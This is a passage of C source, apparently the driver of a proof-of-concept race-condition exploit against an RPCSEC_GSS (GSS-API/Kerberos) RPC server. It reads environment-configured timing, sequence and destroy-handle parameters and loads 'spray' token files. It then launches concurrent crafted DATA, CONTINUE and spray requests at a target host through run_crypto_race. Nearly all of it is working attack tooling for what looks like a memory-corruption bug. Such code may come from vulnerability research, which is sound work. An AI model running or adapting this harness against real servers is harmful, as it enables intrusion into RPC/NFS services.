            fprintf(stderr, "invalid race plaintext length: %s\n", argv[9]);
            goto out;
        }
    }
    if (data_delay_env != NULL && data_delay_env[0] != '\0') {
        char *end = NULL;

        race_data_delay_us = strtoul(data_delay_env, &end, 0);
        if (end == NULL || *end != '\0' ||
            race_data_delay_us > 1000000UL) {
            fprintf(stderr, "invalid RPC_GSS_DATA_DELAY_US: %s\n",
                data_delay_env);
            goto out;
        }
    }
    if (data_stagger_env != NULL && data_stagger_env[0] != '\0') {
        char *end = NULL;

        race_data_stagger_us = strtoul(data_stagger_env, &end, 0);
        if (end == NULL || *end != '\0' ||
            race_data_stagger_us > 1000000UL ||
            (race_data_count > 1 &&
            race_data_delay_us +
            (race_data_count - 1) * race_data_stagger_us > 1000000UL)) {
            fprintf(stderr, "invalid RPC_GSS_DATA_STAGGER_US: %s\n",
                data_stagger_env);
            goto out;
        }
    }
    int schedule_result = parse_delay_schedule(data_delay_schedule_env,
        (unsigned)race_data_count, race_data_delays);
    if (schedule_result < 0) {
        fprintf(stderr, "invalid RPC_GSS_DATA_DELAY_SCHEDULE: %s\n",
            data_delay_schedule_env);
        goto out;
    }
    if (schedule_result > 0) {
        race_data_delay_schedule = race_data_delays;
        printf("race_data_delay_schedule=");
        for (unsigned i = 0; i < race_data_count; i++) {
            printf("%s%u", i == 0 ? "" : ",", race_data_delays[i]);
        }
        printf("\n");
    }
    if (data_sequence_env != NULL && data_sequence_env[0] != '\0') {
        char *end = NULL;
        unsigned long long parsed;

        errno = 0;
        parsed = strtoull(data_sequence_env, &end, 0);
        if (errno != 0 || end == NULL || *end != '\0' ||
            parsed == 0 || parsed > UINT32_MAX) {
            fprintf(stderr, "invalid RPC_GSS_DATA_SEQUENCE: %s\n",
                data_sequence_env);
            goto out;
        }
        race_data_sequence = (uint32_t)parsed;
    }
    if (prime_destroy_handle_env != NULL &&
        prime_destroy_handle_env[0] != '\0') {
        char *end = NULL;
        unsigned long long parsed;

        errno = 0;
        parsed = strtoull(prime_destroy_handle_env, &end, 0);
        if (errno != 0 || end == NULL || *end != '\0' ||
            parsed == 0 || parsed > UINT32_MAX ||
            race_data_count == 0) {
            fprintf(stderr, "invalid RPC_GSS_PRIME_DESTROY_HANDLE: %s\n",
                prime_destroy_handle_env);
            goto out;
        }
        prime_destroy_handle = (uint32_t)parsed;
        printf("prime_destroy_handle=%08x\n", prime_destroy_handle);
        fflush(stdout);
    }
    if (spray_count_env != NULL && spray_count_env[0] != '\0') {
        char *end = NULL;

        race_spray_count = strtoul(spray_count_env, &end, 0);
        if (end == NULL || *end != '\0' ||
            race_spray_count > MAX_RACE_REQUESTS ||
            race_data_count + race_continue_count + race_spray_count >
            512UL) {
            fprintf(stderr, "invalid RPC_GSS_SPRAY_COUNT: %s\n",
                spray_count_env);
            goto out;
        }
    }
    if (spray_delay_env != NULL && spray_delay_env[0] != '\0') {
        char *end = NULL;

        race_spray_delay_us = strtoul(spray_delay_env, &end, 0);
        if (end == NULL || *end != '\0' ||
            race_spray_delay_us > 1000000UL) {
            fprintf(stderr, "invalid RPC_GSS_SPRAY_DELAY_US: %s\n",
                spray_delay_env);
            goto out;
        }
    }
    if (spray_stagger_env != NULL && spray_stagger_env[0] != '\0') {
        char *end = NULL;

        race_spray_stagger_us = strtoul(spray_stagger_env, &end, 0);
        if (end == NULL || *end != '\0' ||
            race_spray_stagger_us > 1000000UL ||
            (race_spray_count != 0 &&
            race_spray_stagger_us > 5000000UL / race_spray_count)) {
            fprintf(stderr, "invalid RPC_GSS_SPRAY_STAGGER_US: %s\n",
                spray_stagger_env);
            goto out;
        }
    }
    if (continue_zero_token_env != NULL &&
        continue_zero_token_env[0] != '\0') {
        if (strcmp(continue_zero_token_env, "1") != 0) {
            fprintf(stderr, "invalid RPC_GSS_CONTINUE_ZERO_TOKEN: %s\n",
                continue_zero_token_env);
            goto out;
        }
        continue_zero_token = true;
        printf("alternate_continue_token=zero-length length=0\n");
        fflush(stdout);
    }
    if (reload_tokens_after_gate_env != NULL &&
        reload_tokens_after_gate_env[0] != '\0') {
        if (strcmp(reload_tokens_after_gate_env, "1") != 0) {
            fprintf(stderr, "invalid RPC_GSS_RELOAD_TOKENS_AFTER_GATE: %s\n",
                reload_tokens_after_gate_env);
            goto out;
        }
        reload_tokens_after_gate = true;
        printf("race_tokens_deferred_until_sequence_gate=1\n");
        fflush(stdout);
    }
    if (duplicate_data_env != NULL && duplicate_data_env[0] != '\0') {
        if (strcmp(duplicate_data_env, "1") != 0) {
            fprintf(stderr, "invalid RPC_GSS_DUPLICATE_DATA: %s\n",
                duplicate_data_env);
            goto out;
        }
        duplicate_data = true;
        printf("duplicate_data=1\n");
        fflush(stdout);
    }
    if (!reload_tokens_after_gate && !continue_zero_token &&
        continue_token_file != NULL &&
        continue_token_file[0] != '\0') {
        if (read_blob(continue_token_file, &alternate_continue_token,
            &alternate_continue_token_length) < 0) {
            perror("read alternate continue token");
            goto out;
        }
        printf("alternate_continue_token=%s length=%zu\n",
            continue_token_file, alternate_continue_token_length);
        fflush(stdout);
    }
    if (!reload_tokens_after_gate && race_spray_count != 0) {
        if (spray_token_prefix != NULL &&
            spray_token_prefix[0] != '\0') {
            spray_tokens = calloc(race_spray_count,
                sizeof(*spray_tokens));
            spray_token_lengths = calloc(race_spray_count,
                sizeof(*spray_token_lengths));
            if (spray_tokens == NULL || spray_token_lengths == NULL) {
                goto out;
            }
            for (unsigned long i = 0; i < race_spray_count; i++) {
                char path[PATH_MAX];
                int written = snprintf(path, sizeof(path),
                    "%s_%04lu.bin", spray_token_prefix, i);

                if (written < 0 || (size_t)written >= sizeof(path)) {
                    errno = ENAMETOOLONG;
                    perror("spray token path");
                    goto out;
                }
                if (read_blob(path, &spray_tokens[i],
                    &spray_token_lengths[i]) < 0) {
                    perror(path);
                    goto out;
                }
            }
            printf("spray_token_prefix=%s count=%lu delay_us=%lu\n",
                spray_token_prefix, race_spray_count,
                race_spray_delay_us);
        } else {
            if (spray_token_file == NULL ||
                spray_token_file[0] == '\0' ||
                read_blob(spray_token_file, &spray_token,
                &spray_token_length) < 0) {
                perror("read spray token");
                goto out;
            }
            printf("spray_token=%s length=%zu count=%lu delay_us=%lu\n",
                spray_token_file, spray_token_length, race_spray_count,
                race_spray_delay_us);
        }
        fflush(stdout);
    }
    if (race_wait_file != NULL && race_wait_file[0] != '\0') {
        unsigned long polls;

        printf("race_waiting file=%s handle=%08x\n", race_wait_file, handle);
        fflush(stdout);
        for (polls = 0; polls < 120000UL; polls++) {
            if (access(race_wait_file, F_OK) == 0) {
                break;
            }
            usleep(10000);
        }
        if (polls == 120000UL) {
            fprintf(stderr, "timed out waiting for race arm file: %s\n",
                race_wait_file);
            goto out;
        }
        printf("race_armed handle=%08x\n", handle);
        fflush(stdout);
    }
    if (data_sequence_file != NULL && data_sequence_file[0] != '\0') {
        if (read_u32_text_file(data_sequence_file,
            &race_data_sequence) < 0) {
            fprintf(stderr, "invalid RPC_GSS_DATA_SEQUENCE_FILE: %s\n",
                data_sequence_file);
            goto out;
        }
        printf("race_data_sequence=%u source=%s\n",
            race_data_sequence, data_sequence_file);
        fflush(stdout);
    }
    if (reload_tokens_after_gate) {
        if (!continue_zero_token) {
            if (continue_token_file == NULL ||
                continue_token_file[0] == '\0' ||
                read_blob(continue_token_file, &alternate_continue_token,
                &alternate_continue_token_length) < 0) {
                perror("read deferred alternate continue token");
                goto out;
            }
            printf("alternate_continue_token_reloaded=%s length=%zu\n",
                continue_token_file, alternate_continue_token_length);
        }
        if (race_spray_count != 0) {
            if (spray_token_prefix != NULL &&
                spray_token_prefix[0] != '\0') {
                fprintf(stderr, "deferred spray token prefixes unsupported\n");
                goto out;
            }
            if (spray_token_file == NULL ||
                spray_token_file[0] == '\0' ||
                read_blob(spray_token_file, &spray_token,
                &spray_token_length) < 0) {
                perror("read deferred spray token");
                goto out;
            }
            printf("spray_token_reloaded=%s length=%zu count=%lu "
                "delay_us=%lu\n", spray_token_file, spray_token_length,
                race_spray_count, race_spray_delay_us);
        }
        printf("race_tokens_reloaded_after_sequence_gate=1\n");
        fflush(stdout);
    }

    for (unsigned long i = 0; i < privacy_count; i++) {
        if (send_privacy_null(host, context, handle, (uint32_t)(i + 1U),
            xid + 1U + (uint32_t)i) < 0) {
            fprintf(stderr, "privacy DATA failed at iteration %lu\n", i);
            goto out;
        }
    }
    if (privacy_count != 0) {
        printf("privacy_data_success=%lu\n", privacy_count);
    }
    if (race_data_count != 0 || race_continue_count != 0 ||
        race_spray_count != 0) {
        const uint8_t *continue_token = continue_zero_token ? NULL :
            (alternate_continue_token != NULL ?
            alternate_continue_token : initial_token_copy);
        size_t continue_token_length = continue_zero_token ? 0 :
            (alternate_continue_token != NULL ?
            alternate_continue_token_length : initial_token_length);

        if (run_crypto_race(host, context, handle, prime_destroy_handle,
            continue_token,
            continue_token_length, (unsigned)race_data_count,
            (unsigned)race_continue_count,
            (unsigned)race_data_delay_us,
            (unsigned)race_data_stagger_us,
            race_data_delay_schedule,
            duplicate_data,
            (unsigned)race_continue_delay_us,
            spray_token, spray_token_length, spray_tokens,
            spray_token_lengths,
            (unsigned)race_spray_count,
            (unsigned)race_spray_delay_us,
            (unsigned)race_spray_stagger_us,
            (size_t)race_plaintext_length, xid + 0x1000U,
            race_data_sequence, prearm_wait_file,
            data_wait_file, continue_wait_file, spray_wait_file,
            capture_data_reply_file, capture_all_data_reply_prefix,
            capture_continue_reply_file,
            second_data_dtrace_gate) < 0) {
            fprintf(stderr, "crypto race setup failed\n");
            goto out;
        }
    }
    result = server_major == GSS_S_COMPLETE ? 0 : 2;

out:
    if (fd >= 0) {
        close(fd);
    }
    free(request);
    free(reply);
    free(initial_token_copy);
    free(alternate_continue_token);
    free(spray_token);
    if (spray_tokens != NULL) {
        for (unsigned long i = 0; i < race_spray_count; i++) {
            free(spray_tokens[i]);
        }
    }
    free(spray_tokens);
    free(spray_token_lengths);
    if (output_token.length != 0) {
        gss_release_buffer(&minor, &output_token);
    }
    if (context != GSS_C_NO_CONTEXT) {
        gss_delete_sec_context(&minor, &context, GSS_C_NO_BUFFER);
    }
    if (target != GSS_C_NO_NAME) {
        gss_release_name(&minor, &target);
    }
    return result;
}
